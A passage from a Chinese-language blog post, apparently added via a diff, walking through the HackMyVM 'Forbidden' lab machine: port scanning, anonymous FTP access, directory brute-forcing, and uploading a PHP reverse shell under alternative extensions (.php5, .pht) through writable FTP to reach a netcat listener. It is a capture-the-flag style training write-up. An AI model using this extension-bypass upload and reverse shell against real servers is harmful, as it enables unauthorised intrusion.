@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Forbidden靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Forbidden">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/26924.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Forbidden靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67c4189ad0e0a243d409f6d2.png">
+<meta property="article:published_time" content="2025-03-02T07:51:05.000Z">
+<meta property="article:modified_time" content="2025-03-02T08:53:08.745Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67c4189ad0e0a243d409f6d2.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/26924.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Forbidden | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/26924.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Forbidden
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-02 15:51:05 / 修改时间：16:53:08" itemprop="dateCreated datePublished" datetime="2025-03-02T15:51:05+08:00">2025-03-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67c40e17d0e0a243d409e385.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Forbidden靶机复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nmap -A <span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>     </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-02</span> <span class="number">13</span>:<span class="number">56</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span><span class="number">.3</span></span><br><span class="line">| <span class="type">ftp</span>-syst: </span><br><span class="line">|   <span class="type">STAT</span>: </span><br><span class="line">| <span class="type">FTP</span> server status:</span><br><span class="line">|      <span class="type">Connected</span> to ::ffff:<span class="number">192.168</span><span class="number">.58</span><span class="number">.11</span></span><br><span class="line">|      <span class="type">Logged</span> <span class="built_in">in</span> <span class="built_in">as</span> ftp</span><br><span class="line">|      <span class="type">TYPE</span>: ASCII</span><br><span class="line">|      <span class="type">No</span> session bandwidth limit</span><br><span class="line">|      <span class="type">Session</span> <span class="built_in">timeout</span> <span class="built_in">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      <span class="type">Control</span> connection is plain text</span><br><span class="line">|      <span class="type">Data</span> connections will be plain text</span><br><span class="line">|      <span class="type">At</span> session startup, client count was <span class="number">3</span></span><br><span class="line">|      <span class="type">vsFTPd</span> <span class="number">3.0</span><span class="number">.3</span> - secure, fast, stable</span><br><span class="line">|<span class="type">_End</span> of status</span><br><span class="line">| <span class="type">ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|<span class="type">_drwxrwxrwx</span>    <span class="number">2</span> <span class="number">0</span>        <span class="number">0</span>            <span class="number">4096</span> Oct <span class="number">09</span>  <span class="number">2020</span> www [NSE: writeable]</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">|<span class="type">_http</span>-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|<span class="type">_http</span>-server-header: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">MAC Address: <span class="number">6</span>E:<span class="number">0</span>B:<span class="number">06</span>:<span class="number">76</span>:<span class="number">34</span>:C6 (Unknown)</span><br><span class="line">Device type: general purpose|<span class="type">router</span></span><br><span class="line">Running: Linux <span class="number">4.</span>X|<span class="type">5</span>.X, MikroTik RouterOS <span class="number">7.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">4</span> cpe:/o:linux:linux_kernel:<span class="number">5</span> cpe:/o:mikrotik:routeros:<span class="number">7</span> cpe:/o:linux:linux_kernel:<span class="number">5.6</span><span class="number">.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span><span class="number">.3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.66</span> ms bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">8.84</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>开放21和80，先去ftp这里看看能不能匿名登录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 .</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html</span><br><span class="line">-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt</span><br><span class="line">-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat note.txt</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get note.txt</span><br><span class="line">local: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||39793|)</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|    75       14.41 KiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">75 bytes received in 00:00 (8.37 KiB/s)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">ftp&gt; get robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">local: robots.txt remote: robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">229 Entering Extended Passive Mode (|||36280|)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">150 Opening BINARY mode data connection for robots.txt (10 bytes).</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">100% |*</span>**</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    10        6.60 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">10 bytes received in 00:00 (2.20 KiB/s)</span><br></pre></td></tr></table></figure></div>
+<p>登录上去之后发现www目录下面有三个文件，我们直接get拿到本地来，这里应该用目录扫描也能得到这几个文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat note.txt      </span></span><br><span class="line">The extra-secured .jpg <span class="built_in">file</span> <span class="keyword">contains</span> <span class="keyword">my</span> password <span class="keyword">but</span> nobody can obtain <span class="keyword">it</span>.</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat robots.txt </span></span><br><span class="line">/note.txt</span><br></pre></td></tr></table></figure></div>
+
+
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SECURE WEB/FTP</span><br><span class="line">Hi, Im the best admin of the world. You cannot<span class="built_in"> execute </span>.php code on this server so you cannot obtain a reverse shell. Not sure<span class="built_in"> if </span>its misconfigured another things... but the importart is that php is disabled. -marta</span><br></pre></td></tr></table></figure></div>
+<p>这里一直在强调php被ban不能反弹shell  然后还有一个用户名marta<br>那现在就是目录扫描web服务，然后找到扩展名是.jpg的文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.239  -x jpg,php,txt,js</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,js,jpg</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/robots.txt           (Status: 200) [Size: 10]</span><br><span class="line">/note.txt             (Status: 200) [Size: 75]</span><br><span class="line"><span class="section">Progress: 1038215 / 1038220 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure></div>
+<p>扫描结果没有显示多余的信息，那现在的目标只能放在ftp上了，因为web这里已经没有多余的信息。<br>刚才利用ftp下载文件，现在我们也能利用ftp上传文件，因为ftp匿名访问的就是www目录，里面的note.txt就是web可以访问到的路径<br>但是这里一直说php不能执行，我们知道php还有很多扩展名，我们都试试   php3，php5，pht，phtml，phps 都是 php 可运行的文件扩展名</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.php3</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.php5</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.phps</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cp php-reverse-shell.php shell.pht </span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.58.239</span><br><span class="line">Connected to 192.168.58.239.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||5545|)</span><br><span class="line">553 Could not create file.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||36869|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 www</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd www</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||15003|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       30.83 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (557.10 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.php5</span></span><br><span class="line"><span class="strong">local: shell.php5 remote: shell.php5</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||57590|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       30.65 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (930.02 KiB/s)</span><br><span class="line">ftp&gt; put shell.phps</span><br><span class="line">local: shell.phps remote: shell.phps</span><br><span class="line">229 Entering Extended Passive Mode (|||50303|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       11.77 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (857.65 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.pht</span></span><br><span class="line"><span class="strong">local: shell.pht remote: shell.pht</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||34415|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       25.44 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (838.49 KiB/s)</span><br></pre></td></tr></table></figure></div>
+<p>把反弹shell的php文件更改后缀名之后都上传到www目录下面<br>尝试之后发现php5可以，（这里我第一次把php中的ip写错了，所以改了一下名称） 成功拿到了webshell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234            </span><br><span class="line">Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="line"> 03:22:44 up 31 min,  0 users,  load average: 0.35, 0.18, 0.27<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">└─# curl 192.168.58.239/shell1.php5 </span></span><br></pre></td></tr></table></figure></div>
+
